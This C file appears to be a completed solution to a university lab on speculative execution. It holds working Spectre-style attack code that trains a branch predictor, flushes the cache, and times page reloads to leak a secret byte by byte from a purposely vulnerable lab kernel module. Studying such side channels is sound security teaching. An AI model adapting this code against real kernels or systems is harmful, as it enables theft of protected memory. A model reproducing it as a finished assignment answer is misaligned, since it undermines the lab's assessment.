/*
 * Exploiting Speculative Execution
 *
 * Part 3
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "labspectre.h"
#include "labspectreipc.h"

/*
 * call_kernel_part3
 * Performs the COMMAND_PART3 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

// Helper method to flush the shared memory pages before the attack
static void flush_shared_pages(char *shared_memory) {
    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        clflush(shared_memory + (i * SHD_SPECTRE_LAB_PAGE_SIZE));
    }
}

// Return the fastest page index if it looks like a cache hit; otherwise return -1
static int fastest_hit_page(char *shared_memory, uint64_t threshold, uint64_t *best_time_out) {
    uint64_t best_time = UINT64_MAX;
    size_t best_index = 0;

    // Access pages in a pseudo-random order to prevent stride prediction from hiding hits
    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        size_t idx = ((i * 167) + 13) & 0xff;
        char *addr = shared_memory + (idx * SHD_SPECTRE_LAB_PAGE_SIZE);
        uint64_t access_time = time_access(addr);
        if (access_time < best_time) {
            best_time = access_time;
            best_index = idx;
        }
    }

    if (best_time_out != NULL) {
        *best_time_out = best_time;
    }

    if (best_time < threshold) {
        return (int)best_index;
    }
    return -1;
}

// Touch a large buffer to evict cache lines and increase latency of subsequent kernel data loads
static void thrash_cache(void) {
    const size_t eviction_size = 4 * 1024 * 1024;
    static char *eviction_buffer = NULL;
    static volatile uint64_t sink = 0;

    // Allocate a large eviction buffer, and touch each page to ensure it's resident
    if (eviction_buffer == NULL) {
        eviction_buffer = (char *)malloc(eviction_size);
        if (eviction_buffer == NULL) {
            return;
        }

        for (size_t i = 0; i < eviction_size; i += 4096) {
            eviction_buffer[i] = (char)i;
        }
    }

    for (size_t i = 0; i < eviction_size; i += 128) {
        sink += (uint64_t)eviction_buffer[i];
    }
}

// Helper method to identify the indices of the top two counts in an array
static void top_two_indices(const size_t *counts, size_t *best_index, size_t *best_count, size_t *second_index, size_t *second_count) {
    size_t bi = 0;
    size_t bc = 0;
    size_t si = 0;
    size_t sc = 0;

    // this loop identifies index of the best count (bi) and second best count (si)
    for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        if (counts[i] > bc) {
            si = bi;
            sc = bc;
            bi = i;
            bc = counts[i];
        }
        else if (counts[i] > sc) {
            si = i;
            sc = counts[i];
        }
    }

    // write results to output pointers if they are non-null
    if (best_index != NULL) {
        *best_index = bi;
    }
    if (best_count != NULL) {
        *best_count = bc;
    }
    if (second_index != NULL) {
        *second_index = si;
    }
    if (second_count != NULL) {
        *second_count = sc;
    }
}

// Helper method to identify the best nonzero index in an array
static size_t best_nonzero_index(const size_t *counts) {
    size_t best_idx = 1;
    size_t best_count = 0;

    // this loop identifies index of the best nonzero count
    for (size_t i = 1; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        if (counts[i] > best_count) {
            best_count = counts[i];
            best_idx = i;
        }
    }

    return best_idx;
}

// Repeatedly perform Train/Flush/Victim/Reload and accumulate vote counts
static void collect_votes_part3(int kernel_fd, char *shared_memory, size_t target_offset, size_t attack_attempts, size_t *hit_counts) {
    const uint64_t reload_threshold = 130;
    const size_t training_rounds = 48;

    for (size_t attempt = 0; attempt < attack_attempts; attempt++) {
        // Train predictor with in-bounds offsets so the victim branch is predicted taken
        for (size_t train = 0; train < training_rounds; train++) {
            call_kernel_part3(kernel_fd, shared_memory, train & 0x3);
        }

        // Flush after training so in-bounds loads do not dominate the measurement
        flush_shared_pages(shared_memory);
        thrash_cache();

        // Trigger victim once with the target offset
        // twice to give the speculative execution more chances to leak and increase confidence of each vote
        call_kernel_part3(kernel_fd, shared_memory, target_offset);
        call_kernel_part3(kernel_fd, shared_memory, target_offset);

        // Measure and record only the strongest candidate each attempt
        uint64_t best_time = UINT64_MAX;
        int idx = fastest_hit_page(shared_memory, reload_threshold, &best_time);
        if (idx >= 0) {
            hit_counts[(size_t)idx]++;
        }
    }
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the kernel
 */
int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    for (size_t i = 0; i < SHD_SPECTRE_LAB_SECRET_MAX_LEN; i++) {
        leaked_str[i] = '\x00';
    }

    printf("Launching attacker\n");

    // loop over each byte of the secret we want to leak
    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++) {
        char leaked_byte;
        size_t hit_counts[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES] = {0};
        size_t best_index = 0;
        size_t best_count = 0;
        size_t second_index = 0;
        size_t second_count = 0;

        // [Part 3]- Fill this in!
        // leaked_byte = ??
        collect_votes_part3(kernel_fd, shared_memory, current_offset, 700, hit_counts);
        top_two_indices(hit_counts, &best_index, &best_count, &second_index, &second_count);

        // If confidence is weak, gather more samples for this byte.
        if (best_count < (second_count + 12)) {
            collect_votes_part3(kernel_fd, shared_memory, current_offset, 1400, hit_counts);
            top_two_indices(hit_counts, &best_index, &best_count, &second_index, &second_count);
        }

        leaked_byte = (char)best_index;

        // Avoid terminating too early from a noisy null byte.
        if (leaked_byte == '\x00' && current_offset < 12) {
            collect_votes_part3(kernel_fd, shared_memory, current_offset, 2200, hit_counts);
            top_two_indices(hit_counts, &best_index, &best_count, &second_index, &second_count);
            leaked_byte = (char)best_nonzero_index(hit_counts);
        }

        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00' && current_offset >= 12) {
            break;
        }
    }

    leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1] = '\x00';
    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    close(kernel_fd);
    return EXIT_SUCCESS;
}